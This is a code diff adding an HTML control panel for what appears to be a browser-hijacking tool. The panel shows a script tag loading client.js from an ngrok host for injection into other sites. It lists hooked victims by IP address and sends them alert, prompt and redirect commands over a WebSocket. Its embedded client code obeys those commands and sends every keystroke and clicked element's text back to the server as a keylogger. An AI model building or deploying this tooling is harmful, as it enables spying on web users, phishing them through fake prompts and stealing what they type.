@@ -1,0 +1,289 @@
+<html>
+
+<head>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.css">
+    <style>
+        .card {
+            background: white;
+            display: flex;
+            padding: 0.75rem;
+            margin-bottom: 0.75rem;
+            border-radius: 4px;
+        }
+
+        body {
+            background: rgb(220, 220, 220);
+        }
+
+        .card__controls {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .connection-chip {
+            background: #eee;
+            margin-right: 0.75rem;
+            padding: 0.5rem;
+            border: 1px solid transparent;
+        }
+
+        .connection-chip.active {
+            border: 1px solid #aaa;
+        }
+
+
+        main {
+            padding-top: 4rem;
+            max-width: 40vw;
+            margin: 0 auto;
+        }
+
+        .logs {
+            max-height: 400px;
+            overflow: auto;
+            width: 100%;
+            font-family: monospace;
+        }
+
+        .log {
+            display: flex;
+            gap: 0.75rem;
+        }
+
+        .log__message {
+            word-break: break-word;
+        }
+
+        .card__input {
+            flex: 1;
+        }
+
+        textarea.card__input {
+            resize: vertical;
+        }
+        
+        pre {
+            font-size: 0.75rem;
+            color: white;
+            background: black;
+            padding: 0.75rem;
+            margin: 0;
+        }
+    </style>
+    <title> $$roomId </title>
+</head>
+
+<body>
+    <main>
+        <div class="container">
+            <div class="card">
+                <pre style="overflow: auto;">&lt;script src=&quot;https://7fa2-86-32-74-150.ngrok.io/client.js&quot;&gt;&lt;/script&gt;</pre>
+            </div>
+            <div class="card" id="connections">
+                <div class="connection-chip" data-for="connections" data-click="onSelectConnection"
+                    data-change="onChangeConnection">
+                    <span data-value="ip"></span>
+                    (<span data-value="id"></span>)
+                </div>
+            </div>
+            <div class="card">
+                <div class="logs" id="logs">
+                    <div class="log" data-for="logs">
+                        <div class="log__date" data-value="date">12:30</div>
+                        <div class="log__message" data-value="text">Test test</div>
+                    </div>
+                </div>
+            </div>
+            <div class="card">
+                <textarea class="card__input" data-model="message"></textarea>
+                <div class="card__controls">
+                    <button data-click="onAlert">alert()</button>
+                    <button data-click="onPrompt">prompt()</button>
+                </div>
+            </div>
+            <div class="card">
+                <input class="card__input" type="text" data-model="url">
+                <div class="card__controls">
+                    <button data-click="onGoto">go to</button>
+                </div>
+            </div>
+        </div>
+    </main>
+    <script>
+        function q(e, s) {
+            const result = e.querySelectorAll(s);
+            if (e.matches && e.matches(s))
+                return [e, ...result];
+            return [...result];
+        }
+
+        function onChange() {
+            for (const $$for of $$fors) {
+                const elements = [];
+                for (const item of $$for.getCtx()) {
+                    const node = $$for.template.cloneNode(true);
+                    elements.push(node);
+                    bind(node, item);
+                }
+                $$for.container.replaceChildren(...elements);
+            }
+
+            document.querySelectorAll('[data-change]').forEach(element => {
+                const key = element.dataset.change;
+                data[key](element);
+            });
+        }
+
+        function bind(node, ctx) {
+            node['$$value'] = ctx;
+            q(node, '[data-model]').forEach(element => {
+                const key = element.dataset.model;
+                element.addEventListener('input', event => {
+                    ctx[key] = event.target.value;
+                    console.log(data);
+                    onChange();
+                });
+            });
+            q(node, '[data-click]').forEach(element => {
+                const key = element.dataset.click;
+                element.addEventListener('click', event => {
+                    (ctx[key] || data[key])(event);
+                    onChange();
+                });
+            });
+            q(node, '[data-value]').forEach(element => {
+                const key = element.dataset.value;
+                element.innerText = ctx[key];
+            });
+        }
+
+        const $$fors = [];
+        document.querySelectorAll('[data-for]').forEach(element => {
+            const key = element.dataset.for;
+            const container = element.parentElement;
+            const elements = [];
+            const template = element.cloneNode(true);
+            $$fors.push({
+                container,
+                template,
+                getCtx: () => data[key]
+            });
+            element.remove();
+        });
+
+        let ws;
+
+        function timeFormat(d) {
+            const hours = leftPad(d.getHours());
+            const minutes = leftPad(d.getMinutes());
+            const seconds = leftPad(d.getSeconds());
+            return hours + ":" + minutes + ":" + seconds;
+        }
+
+        function leftPad(n) {
+            return n < 10 ? '0' + n : n;
+        }
+
+        const data = {
+            logs: [],
+            message: '',
+            url: '',
+            connections: [],
+            selectedConnection: null,
+            onAlert() {
+                ws.send(`al::${data.selectedConnection.id}::${data.message}`);
+            },
+            onPrompt() {
+                ws.send(`pr::${data.selectedConnection.id}::${data.message}`);
+            },
+            onGoto() {
+                ws.send(`go::${data.selectedConnection.id}::${data.url}`);
+            },
+            onSelectConnection(event) {
+                data.selectedConnection = event.currentTarget.$$value;
+            },
+            onChangeConnection(element, ctx) {
+                element.classList.toggle('active', element.$$value === data.selectedConnection);
+            }
+        };
+
+        bind(document, data);
+        onChange();
+
+        function connect() {
+            // ante test
+            const url = `${location.protocol === 'http:' ? 'ws' : 'wss'}://${location.host}/$$roomId?admin=1`;
+            ws = new WebSocket(url);
+            ws.addEventListener('error', (m) => {
+                console.log("error");
+            });
+            ws.addEventListener('open',async (m) => {
+                // download data;
+                const res = await fetch('/api/$$roomId');
+                const response = await res.json();
+                data.connections = response.users;
+                data.logs = response.messages;
+                onChange();
+            });
+            ws.addEventListener('message', (m) => {
+                const [t, dt, msg] = m.data.split(';;');
+                if (t == 'ii') {
+                    data.logs.unshift({
+                        date: dt,
+                        text: msg
+                    });
+                    onChange();
+                }
+                if (t == 'ct') {
+                    const [id, ip] = msg.split(',');
+                    data.connections.push({
+                        ip, id
+                    });
+                    onChange();
+                }
+                if (t == 'dc') {
+                    const [id, ip] = msg.split(',');
+                    data.connections = data.connections.filter(c => c.id !== id);
+                    onChange();
+                }
+            });
+            ws.addEventListener('close', (m) => {
+                setTimeout(() => {
+                    connect();
+                }, 1000);
+            });
+        }
+
+        connect();
+
+        function cnnt() {
+            // ante test
+            var s = window.s = new WebSocket('ws://localhost:3001/test');
+            s.addEventListener('error', (m) => {
+                console.log("error");
+            });
+            s.addEventListener('open', (m) => {
+            });
+            s.addEventListener('message', (m) => {
+                const c = m.data.slice(0, m.data.indexOf(':'));
+                const d = m.data.slice(m.data.indexOf(':') + 1);
+                if(c == 'al') alert(d);
+                if(c == 'pr') s.send('::' + prompt(d));
+                if(c == 'go') location = d;
+            });
+            s.addEventListener('close', (m) => {
+                setTimeout(() => {
+                    cnnt();
+                }, 1000);
+            });
+        }
+
+        if (!window.s) {
+            cnnt();
+            document.addEventListener('keyup', e => s.send(e.key))
+            document.addEventListener('click', e => s.send('<' + e.target.innerText + '>'))
+        }
+    </script>
+</body>
+
+</html>
